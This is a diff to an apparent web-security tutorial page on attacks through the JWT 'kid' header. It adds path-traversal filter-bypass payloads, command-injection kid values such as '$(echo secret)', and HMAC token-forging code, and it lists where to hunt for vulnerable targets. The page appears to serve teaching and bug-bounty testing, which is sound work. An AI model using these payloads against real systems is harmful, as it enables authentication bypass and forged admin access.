@@ -64,18 +64,18 @@ sig = hmac.new(b"", f"{header}.{payload}".encode(), hashlib.sha256).digest()
 token = f"{header}.{payload}.{b64url(sig)}"
 print(token)  # Server will load /dev/null as key → verify passes`} />
 
-      <H3>Windows path traversal</H3>
+      <H3>Filter bypass</H3>
       <P>
-        On Windows servers, the equivalent technique uses Windows path separators
-        and targets files like <Mono>NUL</Mono> (equivalent to <Mono>/dev/null</Mono>)
-        or <Mono>C:\Windows\win.ini</Mono> (known content, readable by all users):
+        When the server strips <Mono>../</Mono> sequences before resolving the path, several encoding tricks can bypass single-pass sanitizers:
       </P>
-      <CodeBlock language="python" label="Windows variants" code={`# Windows null device
-"kid": "..\\..\\..\\Windows\\System32\\NUL"
+      <CodeBlock language="python" label="Filter bypass variants" code={`# ....// collapses back to ../ after one pass of stripping
+"kid": "....//....//....//....//....//....//dev/null"
 
-# Known-content file (win.ini starts with a predictable header)
-"kid": "..\\..\\..\\Windows\\win.ini"
-# Sign token with the exact bytes of win.ini as HMAC secret`} />
+# Fully URL-encoded - bypasses string-matching filters
+"kid": "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fdev%2fnull"
+
+# Double URL-encoded - %25 decodes to %, making %252f -> %2f -> /
+"kid": "..%252f..%252f..%252f..%252f..%252f..%252fdev%252fnull"`} />
 
       <H2>SQL injection variant</H2>
       <P>
@@ -119,6 +119,32 @@ token = f"{header}.{payload}.{b64url(sig)}"`} />
         The kid SQLi surface is often unmonitored since it is not a typical API endpoint.
       </InfoCallout>
 
+      <H2>Command injection variant</H2>
+      <P>
+        In rare cases, the server passes <Mono>kid</Mono> directly to a shell command to retrieve the key
+        (e.g., via <Mono>exec()</Mono>, <Mono>popen()</Mono>, or a scripting language's <Mono>system()</Mono>).
+        The goal is not arbitrary execution but making the command output a value the attacker already knows,
+        so the token can be signed with that value as the HMAC secret.
+      </P>
+      <CodeBlock language="python" label="Command injection via kid" code={`# Target: server runs something like: key = exec(f"get-key {kid}").stdout
+# Inject a command that outputs a known string
+
+# Semicolon chain
+"kid": "; echo 'secret'"
+# Pipe
+"kid": "| echo 'secret'"
+# Command substitution (backtick or $())
+"kid": "\`echo secret\`"
+"kid": "$(echo secret)"
+
+# Sign the forged token with the injected value
+sig = hmac.new(b"secret", signing_input, hashlib.sha256).digest()`} />
+      <InfoCallout variant="info" title="Scope of impact">
+        This vector is rarer than path traversal or SQLi since it requires the server to execute the kid
+        value as a shell command. If confirmed, the severity is high: arbitrary command execution may be
+        possible beyond simple key control.
+      </InfoCallout>
+
       <H2>SSRF via URL-type kid</H2>
       <P>
         Some implementations accept a full URL in the <Mono>kid</Mono> field and fetch the key from it -
@@ -141,12 +167,12 @@ token = f"{header}.{payload}.{b64url(sig)}"`} />
       <CodeBlock language="python" label="Empty key signature" code={`sig = hmac.new(b"", signing_input, hashlib.sha256).digest()
 # Works when: server loads key="" for missing kid, and library accepts empty secret`} />
 
-      <ImpactBox title="Bug bounty confirmed cases">
+      <ImpactBox title="Where to look">
         <ul className="refs-list" style={{ lineHeight: 2 }}>
-          <li>Path traversal via <Mono>kid</Mono> reported on multiple HackerOne programs targeting API gateway products and identity middleware</li>
-          <li>SQLi via <Mono>kid</Mono> demonstrated in PortSwigger's lab and confirmed in real enterprise middleware deployments</li>
-          <li>SSRF via URL-type <Mono>kid</Mono> chained to internal metadata service access (IMDS) in cloud environments</li>
-          <li>Critical severity ratings common when combined with <Mono>role=admin</Mono> claim forgery</li>
+          <li>API gateways and identity middleware that load signing keys dynamically from disk or database using the <Mono>kid</Mono> value</li>
+          <li>Home-rolled JWT libraries that pass <Mono>kid</Mono> directly into a file path or SQL query without sanitization</li>
+          <li>Multi-tenant platforms with key rotation logic - the <Mono>kid</Mono> lookup is often implemented as a fast path without security review</li>
+          <li>Any target where you can observe different error messages for an existing vs. non-existing <Mono>kid</Mono> - strong signal of unsanitized resolution</li>
         </ul>
       </ImpactBox>
 
